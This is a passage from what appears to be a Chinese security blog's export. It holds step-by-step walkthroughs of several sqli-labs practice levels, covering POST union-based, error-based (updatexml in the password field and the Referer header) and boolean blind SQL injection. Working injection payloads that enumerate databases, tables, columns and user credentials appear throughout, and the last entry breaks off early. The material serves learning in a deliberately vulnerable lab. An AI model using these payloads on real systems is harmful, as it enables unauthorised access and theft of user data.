    <title>sqli-labs关卡/sqli-labs第十一关POST联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<p>POST注入，POST注入经常用于登录框</p>
<p>这是初始界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429372105.png" alt="1584429372105"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先用万能的单引号看一下能否出来报错信息，密码随便输入，什么都行</span><br><span class="line">发现报错了，然后使用注释符注释一下看看能否返回正常，如果返回正常说明存在POST注入点</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429460705.png" alt="1584429460705"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">页面返回成功没有报错，说明当前是单引号闭合，存在注入点，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429545956.png" alt="1584429545956"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按照union 注入的方式查看一下当前字段数，发现居然报错了，字段数并不是3，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429609557.png" alt="1584429609557"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下2试试，发现字段2返回正常说明POST这里当前字段是2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429661891.png" alt="1584429661891"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道字段数了，查看一下注入点</span><br><span class="line">1&#39; union select 1,2 #</span><br><span class="line">页面返回了1和2这两个注入点，我们在2的位置查看一下当前数据库</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429753963.png" alt="1584429753963"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下当前数据库</span><br><span class="line">1&#39; union select 1,database() #</span><br><span class="line">当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429804427.png" alt="1584429804427"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道数据库了，查看一下当前数据库下的表名</span><br><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; #</span><br><span class="line">发现有emails,referers,uagents,users这四个表，大部分用户信息都在users表中，查看一下users表</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584429947577.png" alt="1584429947577"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下users表中是否我有我想要的用户信息字段</span><br><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line">其中users表中这么多字段，发现有id，username,password，我们查看一下这三个字段的用户信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584430084871.png" alt="1584430084871"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id，username，password这三个字段</span><br><span class="line">1&#39; union select 1,group_concat(id,username,password) from users #</span><br><span class="line">成功地返回了用户信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584430214326.png" alt="1584430214326"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十七关POST报错password处</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/</url>
    <content><![CDATA[<p>查看源码，这是最重要的两条，发现使用了check_input对uname输入的内容进行了过滤，但是他只过滤了uname，却没有过滤passwd，所以我们可以在passwd的位置记性sql注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584514620834.png" alt="1584514620834"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为知道passwd的位置没有过滤，我们在他的位置输入万能的单引号 ‘ 查看一下是否会有报错信息</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; &amp;submit&#x3D;Submit</span><br><span class="line">成功地返回了报错信息，仔细查看错误信息发现admin最后又两个单引号，所以需要用注释符注释一下</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; #&amp;submit&#x3D;Submit</span><br><span class="line">页面返回正常，说明存在注入点，可以注入</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515105509.png" alt="1584515105509"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515211297.png" alt="1584515211297"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询当前数据库，因为只有报错的时候显示没其他的时候只会返回成功与不成功，所以使用报错注入</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;submit&#x3D;Submit</span><br><span class="line">成功返回当前数据库信息，当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515314043.png" alt="1584515314043"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道数据库了查询一下security下的表名</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) #&amp;submit&#x3D;Submit</span><br><span class="line">因为报错注入只能显示一行，所以需要加上limi来一行一行显示</span><br><span class="line">这里成功地返回了第一个表名，如果要查询其他的表名，更改limit的值就可以</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515409106.png" alt="1584515409106"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们以emails表为例查询表下的字段</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 1,1),0x7e),1) #&amp;submit&#x3D;Submit</span><br><span class="line">这里查询的是第二个字段，将limit改为了1，limit是从0开始所以改为1</span><br><span class="line">页面成功返回</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515536383.png" alt="1584515536383"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道了email_id字段，查询下该字段的数据</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select email_id from emails limit 0,1),0x7e),1) #&amp;submit&#x3D;Submit</span><br><span class="line">页面成功返回第一个数据</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515661438.png" alt="1584515661438"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进去mysql查看email_id表中的第一个数据是否是Dumb@dhakkan.com</span><br><span class="line">页面返回正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3POST%E6%8A%A5%E9%94%99password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584515792140.png" alt="1584515792140"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十九关POST报错referer位置</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>在登录时候进行抓包，当POST包发送到repeater模块单后运行一下，页面回显成功，字体返回蓝色字体，表示登录成功了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584576613947.png" alt="1584576613947"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以看到 小蓝色字体里面有一个referer，可以推断是 referer位置注入，尝试一下查看当前库名</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(database())),1),&#39;&#39;)#</span><br><span class="line">在referer位置输入SQL注入后，页面返回成功，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584576813926.png" alt="1584576813926"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看表名</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1)),1),&#39;&#39;)#</span><br><span class="line">页面成功返回第一个表信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584576917501.png" alt="1584576917501"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看第一个表的第一行字段</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1)),1),&#39;&#39;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584577003642.png" alt="1584577003642"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id的 第一个数据</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select id from emails limit 0,1)),1),&#39;&#39;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3POST%E6%8A%A5%E9%94%99referer%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584577043664.png" alt="1584577043664"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十五关POST盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在这里我们输入任何东西不返回错误，可以判断使用盲注</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584496565639.png" alt="1584496565639"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用盲注查看当前数据库的第一个字母</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr(database(),1,1)) &#x3D; 115)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">之前错误字体都返回红色，这里返回蓝色说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584496665304.png" alt="1584496665304"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">看一下源码，这一句是非常重要的，也是最有用的</span><br><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;</span><br><span class="line"></span><br><span class="line">我们将我们的公式带进去</span><br><span class="line">这里用直接使用单引号和用or的原因是，or只需要一边成立就执行，这里双引号闭合，里面没有内容，所以不成立，因为or的特性是只要你有一个不成立，第二个不管你成不成立直接执行，所以执行了我们后面的sql语句</span><br><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;&#39; or (select ascii(substr(database(),1,1)) &#x3D; 115)#&#39; and password&#x3D;&#39;$passwd&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里测试其他字母</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr(database(),2,1)) &#x3D; 101)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">输入101返回正确，ascii对应的是e，以此类推，得出当前数据库是 security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584497039432.png" alt="1584497039432"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道当前数据库是security之后查看数据库下的表</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)) &#x3D; 101)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">当输入&#x3D;101时返回蓝色，说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584497624408.png" alt="1584497624408"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们尝试一下输入其他的ascii码看一下是否能返回红色</span><br><span class="line">这里我们将ascii码改为了100，页面返回红色，说明错误，证明sql语句无误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584497680186.png" alt="1584497680186"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按照之前列举库名一样，我们得出第一个表名为emails</span><br><span class="line">测试第四个表名看一下</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1)) &#x3D; 117)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">这里将limit改为3，因为limit是从0开始如果查看第四个改成3</span><br><span class="line">页面返回正确，117对应的是u，以此类推，返回结果是users表</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584497882191.png" alt="1584497882191"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看usres表下的字段</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1)) &#x3D; 117)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">我们查询了第二个字段ascii是117对应的u，类推之后返回 username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584498278910.png" alt="1584498278910"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看username字段下的数据</span><br><span class="line">uname&#x3D;&#39; or (select ascii(substr((select username from users limit 1,1),1,1)) &#x3D; </span><br><span class="line">65)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit</span><br><span class="line">使用burp抓包自动筛选，65对应的是A，因为limit是1所以查看的是第二个数据</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584499384077.png" alt="1584499384077"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录数据库查看第二个数据是否为A，第二个数据开头为A说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584499466457.png" alt="1584499466457"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十六关POST盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>先查看一下源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">底下定义的uname是双引号，将他带劲$sql语句中，只有一个双引号，所以我们使用双引号加括号，将其闭合</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584500839771.png" alt="1584500839771"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将我们写sql语句带入进去</span><br><span class="line">&quot;SELECT username, password FROM users WHERE username&#x3D;(&quot;) or (select ascii(substr(database(),1,1))&#x3D;115)#) and password&#x3D;($passwd) LIMIT 0,1&quot;;</span><br><span class="line">就是这样的效果，闭合双引号，使之不成立，不成立直接执行or后面的sql语句，不管是否正确直接执行，sql语句后面有一个注释符，将开始的语句的括号注释掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入网页中，查看我们的思路和写得代码是否正确</span><br><span class="line">uname&#x3D;&quot;) or (select ascii(substr(database(),1,1))&#x3D;115)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">页面返回蓝色说明正确，115对应的是s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584501201150.png" alt="1584501201150"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">尝试输入一个错误的ascii码，看看是否页面返回红色</span><br><span class="line">页面返货红色，表示错误，sql语句格式正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584501290068.png" alt="1584501290068"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按照上面的结果更改,1,1的值以此类推，得出当前数据库security</span><br><span class="line">知道当前数据库了，查看数据库下的表</span><br><span class="line">uname&#x3D;&quot;) or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">因为页面只返回对或错，并没有数值所以使用盲注</span><br><span class="line">这里当ascii&#x3D;101的时候返回正确，101对应的是e说明第一个字母为e，更改,1,1的值以此类推，得出第一个表时emails，想要查询其他的表的话更改limit的值</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584504226959.png" alt="1584504226959"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们以emails表为例，查询当前表下的字段，可以使用burp抓包，自动扫描</span><br><span class="line">uname&#x3D;&quot;) or (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">进行抓包，然后攻击，扫描出105这个ascii码，105对应的是i，更改,1,1的值查看当前字段后的字母，更改limit查看后面的字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584504629651.png" alt="1584504629651"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们我们经过攻击获得了id，email_id字段，我们查看一下email_id中的数据</span><br><span class="line">uname&#x3D;&quot;) or (select ascii(substr((select email_id from emails limit 0,1),1,1))&#x3D;68)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">这里payload爆出了68，68对应的ascii是D</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584504998893.png" alt="1584504998893"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入数据库查看一下，email_id的第一个数据开头是否为D</span><br><span class="line">判断正确，第一个字母为D,相同结论，如果要查询当前数据后面的字母更改,1,1的值，如果要看其他数据更改limit的值</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584505768300.png" alt="1584505768300"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十二关POST联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<p>POST注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前报错信息输入万能的单引号时候发现页面返回正确，</span><br><span class="line">我们输入双引号试试</span><br><span class="line">1“</span><br><span class="line">页面报错，后面还有一个括号，</span><br></pre></td></tr></table></figure>

